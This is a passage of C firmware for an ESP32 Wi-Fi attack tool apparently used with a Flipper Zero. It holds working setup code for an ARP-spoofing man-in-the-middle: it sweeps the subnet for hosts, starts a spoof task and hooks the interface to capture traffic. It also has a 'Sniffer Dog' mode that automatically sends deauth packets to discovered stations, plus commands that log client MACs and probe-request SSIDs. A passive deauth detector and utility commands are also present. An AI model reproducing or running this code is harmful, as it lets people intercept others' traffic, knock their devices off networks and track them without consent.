        esp_wifi_get_mac(WIFI_IF_STA, pcap_arp_own_mac);

        esp_netif_ip_info_t ip_info;
        esp_netif_get_ip_info(sta_netif, &ip_info);
        pcap_arp_gateway_ip = ip_info.gw.addr;

        bool gw_found = false;
        for (int i = 0; i < ARP_TABLE_SIZE; i++) {
            ip4_addr_t *ip_ret;
            struct netif *nif_ret;
            struct eth_addr *eth_ret;
            if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
                if (ip_ret->addr == pcap_arp_gateway_ip) {
                    memcpy(pcap_arp_gateway_mac, eth_ret->addr, 6);
                    gw_found = true;
                    break;
                }
            }
        }
        if (!gw_found) {
            MY_LOG_INFO(TAG, "PCAP net: Gateway not in ARP table, sending ARP request...");
            ip4_addr_t gw_ip = { .addr = pcap_arp_gateway_ip };
            etharp_request(lwip_nif, &gw_ip);
            vTaskDelay(pdMS_TO_TICKS(1000));
            for (int i = 0; i < ARP_TABLE_SIZE; i++) {
                ip4_addr_t *ip_ret;
                struct netif *nif_ret;
                struct eth_addr *eth_ret;
                if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
                    if (ip_ret->addr == pcap_arp_gateway_ip) {
                        memcpy(pcap_arp_gateway_mac, eth_ret->addr, 6);
                        gw_found = true;
                        break;
                    }
                }
            }
        }
        if (!gw_found) {
            MY_LOG_INFO(TAG, "PCAP net: Could not find gateway MAC. Continuing without ARP spoof.");
        } else {
            MY_LOG_INFO(TAG, "PCAP net: Gateway %d.%d.%d.%d -> %02X:%02X:%02X:%02X:%02X:%02X",
                        ip4_addr1_val(ip_info.gw), ip4_addr2_val(ip_info.gw),
                        ip4_addr3_val(ip_info.gw), ip4_addr4_val(ip_info.gw),
                        pcap_arp_gateway_mac[0], pcap_arp_gateway_mac[1], pcap_arp_gateway_mac[2],
                        pcap_arp_gateway_mac[3], pcap_arp_gateway_mac[4], pcap_arp_gateway_mac[5]);

            oled_display_update_full("> PCAP Net", "  ARP scanning...", "  Discovering hosts", "");
            MY_LOG_INFO(TAG, "PCAP net: Scanning subnet for hosts...");

            uint32_t ip_h = ntohl(ip_info.ip.addr);
            uint32_t mask_h = ntohl(ip_info.netmask.addr);
            uint32_t net_h = ip_h & mask_h;
            uint32_t bcast_h = net_h | ~mask_h;
            int req_sent = 0;
            for (uint32_t t = net_h + 1; t < bcast_h && req_sent < 254; t++) {
                ip4_addr_t target_ip;
                target_ip.addr = htonl(t);
                etharp_request(lwip_nif, &target_ip);
                req_sent++;
                if (req_sent % 10 == 0) vTaskDelay(pdMS_TO_TICKS(10));
            }
            MY_LOG_INFO(TAG, "PCAP net: Sent %d ARP requests, waiting for responses...", req_sent);
            vTaskDelay(pdMS_TO_TICKS(3000));

            pcap_arp_host_count = 0;
            uint32_t own_ip = ip_info.ip.addr;
            for (int i = 0; i < ARP_TABLE_SIZE && pcap_arp_host_count < PCAP_ARP_MAX_HOSTS; i++) {
                ip4_addr_t *ip_ret;
                struct netif *nif_ret;
                struct eth_addr *eth_ret;
                if (etharp_get_entry(i, &ip_ret, &nif_ret, &eth_ret) == 1) {
                    if (ip_ret->addr == own_ip || ip_ret->addr == pcap_arp_gateway_ip) continue;
                    memcpy(pcap_arp_hosts[pcap_arp_host_count].mac, eth_ret->addr, 6);
                    pcap_arp_hosts[pcap_arp_host_count].ip = ip_ret->addr;
                    pcap_arp_host_count++;
                }
            }

            MY_LOG_INFO(TAG, "PCAP net: Found %d hosts to spoof", pcap_arp_host_count);

            if (pcap_arp_host_count > 0) {
                pcap_arp_active = true;
                xTaskCreate(pcap_arp_spoof_task, "pcap_arp", 4096, NULL, 5, &pcap_arp_task_handle);
                MY_LOG_INFO(TAG, "PCAP net: ARP spoof MITM started (IP forwarding enabled)");
            }
        }
        // --- End ARP spoof setup ---

        pcap_original_input = lwip_nif->input;
        pcap_original_linkoutput = lwip_nif->linkoutput;
        lwip_nif->input = pcap_netif_input_hook;
        lwip_nif->linkoutput = pcap_netif_linkoutput_hook;

        {
            char oled_l3[32];
            snprintf(oled_l3, sizeof(oled_l3), "  MITM %d hosts", pcap_arp_host_count);
            oled_display_update_full("> PCAP Net", "  Ethernet RX/TX", oled_l3, pcap_capture_filepath + 18);
        }
        MY_LOG_INFO(TAG, "PCAP net capture started -> %s", pcap_capture_filepath);
    }

    MY_LOG_INFO(TAG, "Use 'stop' to stop capture and save file.");
    return 0;
}

static int cmd_start_sniffer_noscan(int argc, char **argv) {
    (void)argc; (void)argv;
    {
        char oled_l3[32];
        snprintf(oled_l3, sizeof(oled_l3), "  %u networks", g_scan_count);
        oled_display_update_full("> Sniffer", "  Prior scan data", oled_l3, "  Capturing...");
    }
    log_memory_info("start_sniffer_noscan");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Reset stop flag
    operation_stop_requested = false;
    
    if (sniffer_active) {
        MY_LOG_INFO(TAG, "Sniffer already active. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Check if scan was previously performed
    if (!g_scan_done || g_scan_count == 0) {
        MY_LOG_INFO(TAG, "Please scan_networks first.");
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Starting sniffer using existing scan results (%u networks)...", g_scan_count);
    
    // Note: Sniffer results are preserved between sessions. Use 'clear_sniffer_results' to clear them.
    bool had_sniffer_data = (sniffer_ap_count > 0 || probe_request_count > 0);
    
    sniffer_active = true;
    sniffer_scan_phase = false;
    sniffer_selected_mode = false;
    
    // Process existing scan results while preserving sniffer data when possible
    if (had_sniffer_data) {
        sniffer_merge_scan_results();
    } else {
        sniffer_process_scan_results();
    }
    
    // Set promiscuous filter
    esp_wifi_set_promiscuous_filter(&sniffer_filter);
    
    // Enable promiscuous mode
    esp_wifi_set_promiscuous_rx_cb(sniffer_promiscuous_callback);
    esp_wifi_set_promiscuous(true);
    
    // Initialize dual-band channel hopping
    sniffer_channel_index = 0;
    sniffer_current_channel = dual_band_channels[sniffer_channel_index];
    sniffer_last_channel_hop = esp_timer_get_time() / 1000;
    esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
    
    // Start channel hopping task
    if (sniffer_channel_task_handle == NULL) {
        xTaskCreate(sniffer_channel_task, "sniffer_channel", 2048, NULL, 5, &sniffer_channel_task_handle);
        MY_LOG_INFO(TAG, "Started sniffer channel hopping task");
    }
    
    // Set LED to green for active sniffing
    esp_err_t led_err = led_set_color(0, 255, 0);
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for sniffer: %s", esp_err_to_name(led_err));
    }
    
    MY_LOG_INFO(TAG, "Sniffer: Now monitoring %d networks (no scan performed)", sniffer_ap_count);
    MY_LOG_INFO(TAG, "Use 'show_sniffer_results' to see captured clients or 'stop' to stop.");
    
    return 0;
}

static int cmd_show_sniffer_results(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Allow showing results even after sniffer is stopped
    if (sniffer_active && sniffer_scan_phase) {
        MY_LOG_INFO(TAG, "Sniffer is still scanning networks. Please wait...");
        return 0;
    }
    
    if (sniffer_ap_count == 0) {
        MY_LOG_INFO(TAG, "No sniffer data available. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    // Create a sorted array of AP indices by client count (descending)
    int sorted_indices[MAX_SNIFFER_APS];
    for (int i = 0; i < sniffer_ap_count; i++) {
        sorted_indices[i] = i;
    }
    
    // Simple bubble sort by client count (descending)
    for (int i = 0; i < sniffer_ap_count - 1; i++) {
        for (int j = 0; j < sniffer_ap_count - i - 1; j++) {
            if (sniffer_aps[sorted_indices[j]].client_count < sniffer_aps[sorted_indices[j + 1]].client_count) {
                int temp = sorted_indices[j];
                sorted_indices[j] = sorted_indices[j + 1];
                sorted_indices[j + 1] = temp;
            }
        }
    }
    
    // Compact format for Flipper Zero display
    int displayed_count = 0;
    for (int i = 0; i < sniffer_ap_count; i++) {
        int idx = sorted_indices[i];
        sniffer_ap_t *ap = &sniffer_aps[idx];
        
        // Skip broadcast BSSID and our own device
        if (is_broadcast_bssid(ap->bssid) || is_own_device_mac(ap->bssid)) {
            continue;
        }
        
        // Skip APs with no clients
        if (ap->client_count == 0) {
            continue;
        }
        
        displayed_count++;
        
        // Print AP info in compact format: SSID, CH: CLIENT_COUNT
        printf("%s, CH%d: %d\n", ap->ssid, ap->channel, ap->client_count);
        
        // Print each client MAC on a separate line with 1 space indentation
        if (ap->client_count > 0) {
            for (int j = 0; j < ap->client_count; j++) {
                sniffer_client_t *client = &ap->clients[j];
                printf(" %02X:%02X:%02X:%02X:%02X:%02X\n",
                       client->mac[0], client->mac[1], client->mac[2],
                       client->mac[3], client->mac[4], client->mac[5]);
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(20)); // Small delay to avoid overwhelming UART
    }
    
    if (displayed_count == 0) {
        MY_LOG_INFO(TAG, "No APs with clients found.");
    }
    
    return 0;
}

static int cmd_show_sniffer_results_vendor(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Allow showing results even after sniffer is stopped
    if (sniffer_active && sniffer_scan_phase) {
        MY_LOG_INFO(TAG, "Sniffer is still scanning networks. Please wait...");
        return 0;
    }
    
    if (sniffer_ap_count == 0) {
        MY_LOG_INFO(TAG, "No sniffer data available. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    // Create a sorted array of AP indices by client count (descending)
    int sorted_indices[MAX_SNIFFER_APS];
    for (int i = 0; i < sniffer_ap_count; i++) {
        sorted_indices[i] = i;
    }
    
    // Simple bubble sort by client count (descending)
    for (int i = 0; i < sniffer_ap_count - 1; i++) {
        for (int j = 0; j < sniffer_ap_count - i - 1; j++) {
            if (sniffer_aps[sorted_indices[j]].client_count < sniffer_aps[sorted_indices[j + 1]].client_count) {
                int temp = sorted_indices[j];
                sorted_indices[j] = sorted_indices[j + 1];
                sorted_indices[j + 1] = temp;
            }
        }
    }
    
    // Compact format for Flipper Zero display with vendor info
    int displayed_count = 0;
    for (int i = 0; i < sniffer_ap_count; i++) {
        int idx = sorted_indices[i];
        sniffer_ap_t *ap = &sniffer_aps[idx];
        
        // Skip broadcast BSSID and our own device
        if (is_broadcast_bssid(ap->bssid) || is_own_device_mac(ap->bssid)) {
            continue;
        }
        
        // Skip APs with no clients
        if (ap->client_count == 0) {
            continue;
        }
        
        displayed_count++;
        
        // Print AP info in compact format: SSID, CH: CLIENT_COUNT [Vendor]
        const char *ap_vendor = lookup_vendor_name(ap->bssid);
        printf("%s, CH%d: %d [%s]\n", ap->ssid, ap->channel, ap->client_count,
               ap_vendor ? ap_vendor : "Unknown");
        
        // Print each client MAC on a separate line with 1 space indentation and vendor
        if (ap->client_count > 0) {
            for (int j = 0; j < ap->client_count; j++) {
                sniffer_client_t *client = &ap->clients[j];
                const char *client_vendor = lookup_vendor_name(client->mac);
                printf(" %02X:%02X:%02X:%02X:%02X:%02X [%s]\n",
                       client->mac[0], client->mac[1], client->mac[2],
                       client->mac[3], client->mac[4], client->mac[5],
                       client_vendor ? client_vendor : "Unknown");
            }
        }
        
        vTaskDelay(pdMS_TO_TICKS(20)); // Small delay to avoid overwhelming UART
    }
    
    if (displayed_count == 0) {
        MY_LOG_INFO(TAG, "No APs with clients found.");
    }
    
    return 0;
}

static int cmd_clear_sniffer_results(int argc, char **argv) {
    (void)argc; (void)argv;
    
    // Clear all sniffer data
    sniffer_ap_count = 0;
    memset(sniffer_aps, 0, MAX_SNIFFER_APS * sizeof(sniffer_ap_t));
    probe_request_count = 0;
    memset(probe_requests, 0, MAX_PROBE_REQUESTS * sizeof(probe_request_t));
    sniffer_packet_counter = 0;
    sniffer_last_debug_packet = 0;
    
    MY_LOG_INFO(TAG, "Sniffer results cleared.");
    return 0;
}

static int cmd_show_probes(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (probe_request_count == 0) {
        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    MY_LOG_INFO(TAG, "Probe requests: %d", probe_request_count);
    
    // Display each probe request: SSID (MAC)
    for (int i = 0; i < probe_request_count; i++) {
        probe_request_t *probe = &probe_requests[i];
        printf("%s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
               probe->ssid,
               probe->mac[0], probe->mac[1], probe->mac[2],
               probe->mac[3], probe->mac[4], probe->mac[5]);
        
        vTaskDelay(pdMS_TO_TICKS(10)); // Small delay to avoid overwhelming UART
    }
    
    return 0;
}

static int cmd_show_probes_vendor(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (probe_request_count == 0) {
        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    MY_LOG_INFO(TAG, "Probe requests: %d", probe_request_count);
    
    // Display each probe request with vendor: SSID (MAC) [Vendor]
    for (int i = 0; i < probe_request_count; i++) {
        probe_request_t *probe = &probe_requests[i];
        const char *vendor_name = lookup_vendor_name(probe->mac);
        printf("%s (%02X:%02X:%02X:%02X:%02X:%02X) [%s]\n",
               probe->ssid,
               probe->mac[0], probe->mac[1], probe->mac[2],
               probe->mac[3], probe->mac[4], probe->mac[5],
               vendor_name ? vendor_name : "Unknown");
        
        vTaskDelay(pdMS_TO_TICKS(10)); // Small delay to avoid overwhelming UART
    }
    
    return 0;
}

static int cmd_list_probes(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (probe_request_count == 0) {
        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    int unique_count = 0;
    
    // Display each unique SSID only once
    for (int i = 0; i < probe_request_count; i++) {
        probe_request_t *probe = &probe_requests[i];
        
        // Check if this SSID has already been displayed by looking at previous entries
        bool already_displayed = false;
        for (int j = 0; j < i; j++) {
            if (strcmp(probe->ssid, probe_requests[j].ssid) == 0) {
                already_displayed = true;
                break;
            }
        }
        
        // If not displayed yet, display it
        if (!already_displayed) {
            unique_count++;
            printf("%d %s\n", unique_count, probe->ssid);
            
            vTaskDelay(pdMS_TO_TICKS(10)); // Small delay to avoid overwhelming UART
        }
    }
    
    return 0;
}

static int cmd_list_probes_vendor(int argc, char **argv) {
    (void)argc; (void)argv;
    
    if (probe_request_count == 0) {
        MY_LOG_INFO(TAG, "No probe requests captured. Use 'start_sniffer' to collect data.");
        return 0;
    }
    
    int unique_count = 0;
    
    // Display each unique SSID only once with vendor from first seen MAC
    for (int i = 0; i < probe_request_count; i++) {
        probe_request_t *probe = &probe_requests[i];
        
        // Check if this SSID has already been displayed by looking at previous entries
        bool already_displayed = false;
        for (int j = 0; j < i; j++) {
            if (strcmp(probe->ssid, probe_requests[j].ssid) == 0) {
                already_displayed = true;
                break;
            }
        }
        
        // If not displayed yet, display it
        if (!already_displayed) {
            unique_count++;
            const char *vendor_name = lookup_vendor_name(probe->mac);
            printf("%d %s [%s]\n", unique_count, probe->ssid, vendor_name ? vendor_name : "Unknown");
            
            vTaskDelay(pdMS_TO_TICKS(10)); // Small delay to avoid overwhelming UART
        }
    }
    
    return 0;
}

static int cmd_sniffer_debug(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Current sniffer debug mode: %s", sniff_debug ? "ON" : "OFF");
        MY_LOG_INFO(TAG, "Usage: sniffer_debug <0|1>");
        MY_LOG_INFO(TAG, "  0 = disable debug logging");
        MY_LOG_INFO(TAG, "  1 = enable debug logging");
        return 0;
    }
    
    int new_debug = atoi(argv[1]);
    if (new_debug != 0 && new_debug != 1) {
        MY_LOG_INFO(TAG, "Invalid value. Use 0 (disable) or 1 (enable)");
        return 1;
    }
    
    sniff_debug = new_debug;
    MY_LOG_INFO(TAG, "Sniffer debug mode %s", sniff_debug ? "ENABLED" : "DISABLED");
    
    if (sniff_debug) {
        MY_LOG_INFO(TAG, "Debug logging will show detailed packet analysis:");
        MY_LOG_INFO(TAG, "- Packet type, length, channel, RSSI");
        MY_LOG_INFO(TAG, "- All MAC addresses in packet");
        MY_LOG_INFO(TAG, "- AP matching process");
        MY_LOG_INFO(TAG, "- Reason for packet acceptance/rejection");
    }
    
    return 0;
}

static int cmd_start_sniffer_dog(int argc, char **argv) {
    (void)argc; (void)argv;
    oled_display_update_full("> Sniff Dog", "  Hunt AP-STA", "  Auto deauth", "  Active...");
    log_memory_info("start_sniffer_dog");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    if (sniffer_dog_active) {
        MY_LOG_INFO(TAG, "Sniffer Dog already active. Use 'stop' to stop it first.");
        return 1;
    }
    
    if (sniffer_active) {
        MY_LOG_INFO(TAG, "Regular sniffer is active. Use 'stop' to stop it first.");
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Starting Sniffer Dog mode...");
    
    // Activate sniffer_dog
    sniffer_dog_active = true;
    
    // Set LED to red (aggressive mode)
    esp_err_t led_err = led_set_color(255, 0, 0); // Red
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for Sniffer Dog: %s", esp_err_to_name(led_err));
    }
    
    // Set promiscuous filter
    esp_wifi_set_promiscuous_filter(&sniffer_filter);
    
    // Enable promiscuous mode with sniffer_dog callback
    esp_wifi_set_promiscuous_rx_cb(sniffer_dog_promiscuous_callback);
    esp_wifi_set_promiscuous(true);
    
    // Initialize dual-band channel hopping
    sniffer_dog_channel_index = 0;
    sniffer_dog_current_channel = dual_band_channels[0];
    esp_wifi_set_channel(sniffer_dog_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_dog_last_channel_hop = esp_timer_get_time() / 1000;
    
    // Create channel hopping task
    BaseType_t task_created = xTaskCreate(
        sniffer_dog_task,
        "sniffer_dog",
        4096,
        NULL,
        5,
        &sniffer_dog_task_handle
    );
    
    if (task_created != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create Sniffer Dog channel hopping task");
        sniffer_dog_active = false;
        esp_wifi_set_promiscuous(false);
        
        // Return LED to idle
        led_err = led_set_idle();
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to restore idle LED after Sniffer Dog failure: %s", esp_err_to_name(led_err));
        }
        
        return 1;
    }
    
    MY_LOG_INFO(TAG, "Sniffer Dog started - hunting for AP-STA pairs...");
    MY_LOG_INFO(TAG, "Deauth packets will be sent to detected stations.");
    MY_LOG_INFO(TAG, "Use 'stop' to stop.");
    
    return 0;
}

static int cmd_deauth_detector(int argc, char **argv) {
    oled_display_update_full("> Deauth Detect", "  Monitoring...", "  All channels", "  Passive scan");
    log_memory_info("deauth_detector");
    
    // Ensure WiFi is initialized
    if (!ensure_wifi_mode()) {
        return 1;
    }
    
    // Reset stop flag at the beginning of operation
    operation_stop_requested = false;
    
    if (deauth_detector_active) {
        MY_LOG_INFO(TAG, "Deauth detector already active. Use 'stop' to stop it first.");
        return 1;
    }
    
    if (sniffer_active) {
        MY_LOG_INFO(TAG, "Regular sniffer is active. Use 'stop' to stop it first.");
        return 1;
    }
    
    if (sniffer_dog_active) {
        MY_LOG_INFO(TAG, "Sniffer Dog is active. Use 'stop' to stop it first.");
        return 1;
    }
    
    // Reset selected mode state
    deauth_detector_selected_mode = false;
    deauth_detector_selected_channels_count = 0;
    memset(deauth_detector_selected_channels, 0, sizeof(deauth_detector_selected_channels));
    
    // MODE B: With network indices (e.g., deauth_detector 1 3)
    if (argc > 1) {
        // Check if scan was performed
        if (!g_scan_done || g_scan_count == 0) {
            MY_LOG_INFO(TAG, "No scan results available. Run 'scan_networks' first.");
            return 1;
        }
        
        MY_LOG_INFO(TAG, "Starting Deauth Detector in SELECTED mode...");
        
        // Parse indices and extract unique channels
        for (int i = 1; i < argc; i++) {
            int user_idx = atoi(argv[i]);
            int idx = user_idx - 1; // Convert from 1-based (user) to 0-based (internal)
            
            // Validate index
            if (idx < 0 || idx >= (int)g_scan_count) {
                MY_LOG_INFO(TAG, "Invalid index %d (valid: 1-%d), skipping", user_idx, g_scan_count);
                continue;
            }
            
            wifi_ap_record_t *ap = &g_scan_results[idx];
            int channel = ap->primary;
            
            // Check if channel already in list
            bool channel_exists = false;
            for (int j = 0; j < deauth_detector_selected_channels_count; j++) {
                if (deauth_detector_selected_channels[j] == channel) {
                    channel_exists = true;
                    break;
                }
            }
            
            if (!channel_exists && deauth_detector_selected_channels_count < MAX_AP_CNT) {
                deauth_detector_selected_channels[deauth_detector_selected_channels_count++] = channel;
                MY_LOG_INFO(TAG, "  Added: %s (ch %d)", ap->ssid, channel);
            }
        }
        
        if (deauth_detector_selected_channels_count == 0) {
            MY_LOG_INFO(TAG, "No valid channels selected. Aborting.");
            return 1;
        }
        
        deauth_detector_selected_mode = true;
        
        // Build channel list string for display
        char channel_list[128] = {0};
        int offset = 0;
        for (int i = 0; i < deauth_detector_selected_channels_count && offset < 120; i++) {
            offset += snprintf(channel_list + offset, sizeof(channel_list) - offset,
                             "%d%s", deauth_detector_selected_channels[i],
                             (i < deauth_detector_selected_channels_count - 1) ? ", " : "");
        }
        MY_LOG_INFO(TAG, "Monitoring %d channel(s): [%s]", deauth_detector_selected_channels_count, channel_list);
        
    } else {
        // MODE A: No arguments - scan first, then monitor all channels
        MY_LOG_INFO(TAG, "Starting Deauth Detector in SCAN mode...");
        MY_LOG_INFO(TAG, "Scanning networks first...");
        
        // Start WiFi scan with configurable timings
        esp_err_t err = start_background_scan(g_scan_min_channel_time, g_scan_max_channel_time);
        if (err != ESP_OK) {
            if (err == ESP_ERR_INVALID_STATE) {
                MY_LOG_INFO(TAG, "Scan already in progress. Please wait or use 'stop'.");
            } else {
                MY_LOG_INFO(TAG, "Failed to start scan: %s", esp_err_to_name(err));
            }
            return 1;
        }
        
        // Wait for scan to complete (with timeout)
        int timeout_iterations = 0;
        while (g_scan_in_progress && timeout_iterations < 200) { // 20 seconds max (200 * 100ms)
            vTaskDelay(pdMS_TO_TICKS(100));
            timeout_iterations++;
            
            // Check for stop request
            if (operation_stop_requested) {
                MY_LOG_INFO(TAG, "Scan cancelled by user.");
                return 1;
            }
        }
        
        if (g_scan_in_progress) {
            MY_LOG_INFO(TAG, "Scan timed out. Try again later.");
            esp_wifi_scan_stop(); // Force stop the scan
            return 1;
        }
        
        // Verify scan actually completed with results
        if (!g_scan_done || g_scan_count == 0) {
            MY_LOG_INFO(TAG, "No scan results available. Try 'scan_networks' first.");
            return 1;
        }
        
        MY_LOG_INFO(TAG, "Found %d networks.", g_scan_count);
        deauth_detector_selected_mode = false;
    }
    
    // Activate deauth_detector
    deauth_detector_active = true;
    
    // Set LED to yellow (monitoring mode)
    esp_err_t led_err = led_set_color(255, 255, 0); // Yellow
    if (led_err != ESP_OK) {
        ESP_LOGW(TAG, "Failed to set LED for Deauth Detector: %s", esp_err_to_name(led_err));
    }
    
    // Set promiscuous filter for MGMT frames only (deauth is a management frame)
    wifi_promiscuous_filter_t mgmt_filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };
    esp_wifi_set_promiscuous_filter(&mgmt_filter);
    
    // Enable promiscuous mode with deauth_detector callback
    esp_wifi_set_promiscuous_rx_cb(deauth_detector_promiscuous_callback);
    esp_wifi_set_promiscuous(true);
    
    // Initialize channel hopping
    deauth_detector_channel_index = 0;
    if (deauth_detector_selected_mode && deauth_detector_selected_channels_count > 0) {
        deauth_detector_current_channel = deauth_detector_selected_channels[0];
    } else {
        deauth_detector_current_channel = dual_band_channels[0];
    }
    esp_wifi_set_channel(deauth_detector_current_channel, WIFI_SECOND_CHAN_NONE);
    deauth_detector_last_channel_hop = esp_timer_get_time() / 1000;
    
    // Create channel hopping task (stack must be in internal RAM on ESP32-C5)
    BaseType_t task_created = xTaskCreate(
        deauth_detector_task,
        "deauth_det",
        4096,
        NULL,
        5,
        &deauth_detector_task_handle
    );
    
    if (task_created != pdPASS) {
        MY_LOG_INFO(TAG, "Failed to create Deauth Detector channel hopping task");
        deauth_detector_active = false;
        esp_wifi_set_promiscuous(false);
        
        // Return LED to idle
        led_err = led_set_idle();
        if (led_err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to restore idle LED after Deauth Detector failure: %s", esp_err_to_name(led_err));
        }
        
        return 1;
    }
    
    if (deauth_detector_selected_mode) {
        MY_LOG_INFO(TAG, "Deauth Detector started - monitoring selected channels for deauth frames...");
    } else {
        MY_LOG_INFO(TAG, "Deauth Detector started - scanning all channels for deauth frames...");
    }
    MY_LOG_INFO(TAG, "Output: [DEAUTH] CH: <ch> | AP: <name> (<bssid>) | RSSI: <rssi>");
    MY_LOG_INFO(TAG, "Use 'stop' to stop.");
    
    return 0;
}

static int cmd_download(int argc, char **argv) {
    (void)argc;
    (void)argv;

#if HAS_RTC_CNTL_REG && defined(RTC_CNTL_OPTION1_REG) && defined(RTC_CNTL_FORCE_DOWNLOAD_BOOT)
    MY_LOG_INFO(TAG, "Preparing to enter UART download mode. Stopping tasks...");
    (void)cmd_stop(0, NULL);

    // Give Wi-Fi stack a moment to settle before rebooting
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    // Force next boot into the ROM download (serial flashing) mode
    REG_WRITE(RTC_CNTL_OPTION1_REG, RTC_CNTL_FORCE_DOWNLOAD_BOOT);
#if defined(RTC_CNTL_SW_CPU_STALL_REG)
    REG_WRITE(RTC_CNTL_SW_CPU_STALL_REG, 0);
#endif
    MY_LOG_INFO(TAG, "Rebooting into download mode. Connect via UART/USB-UART bridge to flash.");
    esp_rom_software_reset_system();

    // Should never reach here
    return 0;
#elif HAS_LP_AON_REG && defined(LP_AON_SYS_CFG_REG) && defined(LP_AON_FORCE_DOWNLOAD_BOOT) && defined(LP_AON_FORCE_DOWNLOAD_BOOT_S) && defined(LP_AON_FORCE_DOWNLOAD_BOOT_M)
    MY_LOG_INFO(TAG, "Preparing to enter UART/USB download mode (LP AON). Stopping tasks...");
    (void)cmd_stop(0, NULL);

    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    // Set LP_AON_FORCE_DOWNLOAD_BOOT to 01 (boot0 download)
    uint32_t cfg = REG_READ(LP_AON_SYS_CFG_REG);
    cfg &= ~LP_AON_FORCE_DOWNLOAD_BOOT_M;
    cfg |= (1U << LP_AON_FORCE_DOWNLOAD_BOOT_S);
    REG_WRITE(LP_AON_SYS_CFG_REG, cfg);

    MY_LOG_INFO(TAG, "Rebooting into download mode (LP AON). Connect via UART/USB-UART bridge to flash.");
    esp_rom_software_reset_system();
    return 0;
#else
    MY_LOG_INFO(TAG, "Download mode forcing not supported on this target/SDK.");
    return 1;
#endif
}

static int cmd_reboot(int argc, char **argv)
{
    (void)argc; (void)argv;
    oled_display_update_full("> Reboot", "  Unmount SD...", "", "  Restarting...");
    MY_LOG_INFO(TAG,"Restart...");
    safe_restart();  // unmount SD card before restart
    return 0;
}

static int cmd_ping(int argc, char **argv) {
    (void)argc; (void)argv;
    MY_LOG_INFO(TAG, "pong");
    return 0;
}

static int cmd_version(int argc, char **argv) {
    (void)argc; (void)argv;
    MY_LOG_INFO(TAG, "JanOS version: " JANOS_VERSION);
    return 0;
}

static int cmd_led(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: led set <on|off> | led level <1-100> | led read");
        return 1;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: led set <on|off>");
            return 1;
        }

        if (strcasecmp(argv[2], "on") == 0) {
            esp_err_t err = led_set_enabled(true);
            if (err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to enable LED: %s", esp_err_to_name(err));
                return 1;
            }
            err = led_set_idle();
            if (err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to set LED idle color: %s", esp_err_to_name(err));
                return 1;
            }
            led_persist_state();
            MY_LOG_INFO(TAG, "LED turned on (brightness %u%%)", led_brightness_percent);
            return 0;
        } else if (strcasecmp(argv[2], "off") == 0) {
            esp_err_t err = led_set_enabled(false);
            if (err != ESP_OK) {
                ESP_LOGW(TAG, "Failed to disable LED: %s", esp_err_to_name(err));
                return 1;
            }
            led_persist_state();
            MY_LOG_INFO(TAG, "LED turned off (previous brightness %u%% stored)", led_brightness_percent);
            return 0;
        }

        MY_LOG_INFO(TAG, "Usage: led set <on|off>");
        return 1;
    }

    if (strcasecmp(argv[1], "level") == 0) {
        if (argc < 3) {
            MY_LOG_INFO(TAG, "Usage: led level <1-100>");
            return 1;
        }

        int level = atoi(argv[2]);
        if (level < (int)LED_BRIGHTNESS_MIN || level > (int)LED_BRIGHTNESS_MAX) {
            MY_LOG_INFO(TAG, "Brightness must be between %u and %u", LED_BRIGHTNESS_MIN, LED_BRIGHTNESS_MAX);
            return 1;
        }

        esp_err_t err = led_set_brightness((uint8_t)level);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "Failed to set LED brightness: %s", esp_err_to_name(err));
            return 1;
        }
        led_persist_state();

        if (led_is_enabled()) {
            MY_LOG_INFO(TAG, "LED brightness set to %d%%", level);
        } else {
            MY_LOG_INFO(TAG, "LED brightness set to %d%% (LED currently off)", level);
        }
        return 0;
    }

    if (strcasecmp(argv[1], "read") == 0) {
        MY_LOG_INFO(TAG, "LED status: %s, brightness %u%%", led_is_enabled() ? "on" : "off", led_brightness_percent);
        return 0;
    }

    MY_LOG_INFO(TAG, "Usage: led set <on|off> | led level <1-100> | led read");
    return 1;
}

static int cmd_channel_time(int argc, char **argv) {
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: channel_time set <min|max> <ms> | channel_time read <min|max>");
        return 1;
    }

    if (strcasecmp(argv[1], "set") == 0) {
        if (argc < 4) {
            MY_LOG_INFO(TAG, "Usage: channel_time set <min|max> <ms>");
            return 1;
        }
        
        int value = atoi(argv[3]);
        if (value < 1) {
